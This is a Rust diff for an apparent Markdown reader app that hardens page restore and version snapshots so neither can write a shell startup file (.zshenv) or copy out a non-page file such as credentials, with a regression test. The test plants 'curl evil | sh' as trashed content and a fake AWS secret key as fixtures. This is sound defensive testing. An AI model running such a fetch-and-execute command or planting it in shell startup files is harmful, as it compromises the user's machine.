@@ -237,6 +237,11 @@ pub fn delete_page(folder: &str, rel: &str) -> Result<String> {
 /// anything has since appeared at `rel` it refuses, and the page stays in the trash.
 pub fn restore_page(folder: &str, rel: &str, trashed: &str) -> Result<()> {
     let full = safe_join(folder, rel)?;
+    // Only a page goes back, as only a page is deleted: otherwise a Markdown file parked in the
+    // trash could be put back as `.zshenv`, which has no extension to check.
+    if !is_openable_page(&full) {
+        return Err(AppError::Message(format!("Not a page: {rel}")));
+    }
     let trash = reader_dir(folder).join("trash");
     let ext = full.extension().map(|e| e.to_string_lossy().to_string()).unwrap_or_else(|| "md".into());
     let parked = safe_join(&trash.to_string_lossy(), &format!("{trashed}.{ext}"))?;
@@ -507,7 +512,12 @@ pub fn read_version(folder: &str, rel: &str, n: u32) -> Result<String> {
 }
 
 pub fn snapshot_version(folder: &str, rel: &str) -> Result<u32> {
-    let current = fs::read_to_string(safe_join(folder, rel)?)?;
+    let full = safe_join(folder, rel)?;
+    // Versions are of Markdown pages; a snapshot of any other file would be a way to read it.
+    if !is_markdown(&full) {
+        return Err(AppError::Message(format!("Not a page: {rel}")));
+    }
+    let current = fs::read_to_string(full)?;
     let n = list_versions(folder, rel)?.last().map(|v| v.n).unwrap_or(0) + 1;
     let path = versions_dir(folder, rel)?.join(format!("v{n}.md"));
     write_atomic(&path, &current)?;
@@ -1511,6 +1521,32 @@ mod tests {
         write_page(f, "b.markdown", "# B\n").unwrap();
         fs::write(dir.path().join("paper.pdf"), b"%PDF").unwrap();
         assert_eq!(delete_page(f, "paper.pdf").unwrap(), "paper");
+    }
+
+    /// The other ways a page's bytes move: putting a deleted page back, and its version snapshots.
+    /// A Markdown file parked in the trash must not come back as `.zshenv`, and a snapshot must not
+    /// copy out a file that isn't a page (`read_version` would then hand it to the webview).
+    #[test]
+    fn restore_and_snapshots_touch_only_pages_too() {
+        let dir = folder();
+        let f = dir.path().to_str().unwrap();
+        let trash = dir.path().join(".reader/trash");
+        assert!(write_new_page(trash.to_str().unwrap(), "x.md", "curl evil | sh\n").unwrap());
+        assert_eq!(restore_page(f, ".zshenv", "x").unwrap_err().to_string(), "Not a page: .zshenv");
+        assert!(!dir.path().join(".zshenv").exists());
+        assert!(trash.join("x.md").exists(), "the parked file stays parked");
+
+        fs::write(dir.path().join("credentials"), "aws_secret_access_key = abc\n").unwrap();
+        assert_eq!(snapshot_version(f, "credentials").unwrap_err().to_string(), "Not a page: credentials");
+        assert!(list_versions(f, "credentials").unwrap().is_empty());
+
+        // A page and its snapshot round-trip as before.
+        write_md(dir.path(), "a.md", "# A\n");
+        assert_eq!(snapshot_version(f, "a.md").unwrap(), 1);
+        assert_eq!(read_version(f, "a.md", 1).unwrap(), "# A\n");
+        assert_eq!(delete_page(f, "a.md").unwrap(), "a");
+        restore_page(f, "a.md", "a").unwrap();
+        assert_eq!(fs::read_to_string(dir.path().join("a.md")).unwrap(), "# A\n");
     }
 
     #[test]
